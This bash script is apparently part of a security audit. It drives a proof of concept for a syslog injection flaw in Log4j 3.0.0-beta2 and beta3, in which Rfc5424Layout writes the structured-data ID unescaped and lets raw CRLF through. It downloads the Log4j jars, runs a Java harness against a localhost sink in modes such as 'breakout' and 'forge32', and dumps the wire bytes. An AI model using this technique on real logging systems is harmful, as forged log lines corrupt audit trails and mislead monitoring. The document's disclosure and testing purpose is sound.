#!/usr/bin/env bash
#
# Live proof of LOG4J-SDID-INJECTION against the Log4j 3.x line.
#
# The same defect exists in Log4j 3: Rfc5424Layout writes the RFC 5424 SD-ID
# verbatim (Rfc5424Layout.java:551 in origin/main) while escaping the MSG
# (line 369) and the SD parameter names/values (lines 595-596). The 3.x
# StructuredDataId (log4j-kit) is length-only, exactly as in 2.x.
#
# Both released 3.x stacks are exercised:
#
#   3.0.0-beta2  log4j-api + log4j-core + log4j-plugins
#   3.0.0-beta3  log4j-kit + log4j-core + log4j-plugins, plus log4j-api
#                2.24.1 for the legacy API surface log4j-core still calls
#                into (ServiceLoaderUtil.safeStream).
#
# NOTE: pairing log4j-core:3.0.0-beta3 with log4j-api:3.0.0-beta2 fails at
# startup (ServiceConfigurationError / NoSuchMethodError). log4j-api has no
# 3.0.0-beta3 release; the 3.x API ships as log4j-kit.
#
# The two releases also renamed the Rfc5424Layout attributes between them
# (LOG4J-RFC5424-ATTR-DRIFT), so each stack gets the configuration that its
# own release accepts. Both configurations enable newline escaping, and the
# SD-ID still injects a raw CRLF.
#
# Usage: run_poc_3x.sh [port] [mode]
#   mode: baseline | breakout | crlf | forge32 | forgebig | einnl
#
set -euo pipefail

PORT="${1:-5159}"
MODE="${2:-crlf}"
HERE="$(cd "$(dirname "$0")" && pwd)"
CACHE="${LOG4J_AUDIT_CACHE:-$HOME/.cache/log4j-audit/3x}"
MVN="https://repo1.maven.org/maven2/org/apache/logging/log4j"

mkdir -p "$CACHE"
cd "$CACHE"

get() { # <group-artifact> <version>
    local j="$1-$2.jar"
    [ -f "$j" ] || curl -fsSL -o "$j" "$MVN/$1/$2/$j"
    printf "  %-34s %8d bytes\n" "$j" "$(stat -c%s "$j")"
}

run_stack() { # <label> <config> <classpath...>
    local label="$1" config="$2"; shift 2
    local cp="$1"; shift
    local port="$PORT"
    local outdir="out-$label"

    echo
    echo "############################################################"
    echo "### Log4j ${label}"
    echo "############################################################"

    rm -rf "$outdir"; mkdir -p "$outdir"
    cp "$HERE/$config" "$CACHE/log4j2.xml"
    cp "$HERE/SdIdPoC.java" "$HERE/tcp_sink.py" "$CACHE/"

    rm -f "wire-$label.bin"
    echo "=== starting localhost syslog sink on 127.0.0.1:${port} ==="
    python3 tcp_sink.py "$port" "wire-$label.bin" 12 > "sink-$label.log" 2>&1 &
    local sink=$!
    sleep 1.5

    javac -nowarn -cp "$cp" -d "$outdir" SdIdPoC.java
    java -cp "$cp:$CACHE:$outdir" -DsyslogPort="$port" SdIdPoC "$MODE" > "out-$label.txt" 2>&1 || true
    sleep 1
    wait "$sink" 2>/dev/null || true

    echo
    echo "=== app output ==="
    head -12 "out-$label.txt"
    echo
    echo "=== RAW WIRE BYTES (Log4j ${label}, mode=${MODE}) ==="
    python3 - "$CACHE/wire-$label.bin" <<'PY'
import sys
d = open(sys.argv[1], 'rb').read()
print("  total bytes:", len(d))
print("  repr:", repr(d))
print()
for i, l in enumerate(d.split(b"\n")):
    print("  line %d: %r" % (i, l))
PY

    rm -f "out-$label.txt" "sink-$label.log"
    rm -rf "$outdir"
}

# ---------------------------------------------------------------- beta2 ----
B2="3.0.0-beta2"
echo "=== fetching Log4j ${B2} artifacts (cached in $CACHE) ==="
for a in log4j-api log4j-core log4j-plugins; do get "$a" "$B2"; done
CP2="log4j-api-$B2.jar:log4j-core-$B2.jar:log4j-plugins-$B2.jar"
run_stack "$B2" "log4j2-syslog-tcp.xml" "$CP2"

# ---------------------------------------------------------------- beta3 ----
B3="3.0.0-beta3"
API="2.24.1"
echo
echo "=== fetching Log4j ${B3} artifacts (cached in $CACHE) ==="
for a in log4j-kit log4j-core log4j-plugins; do get "$a" "$B3"; done
get log4j-api "$API"
CP3="log4j-kit-$B3.jar:log4j-api-$API.jar:log4j-core-$B3.jar:log4j-plugins-$B3.jar"
run_stack "$B3" "log4j2-syslog-tcp-3x.xml" "$CP3"

rm -f "$CACHE/log4j2.xml"
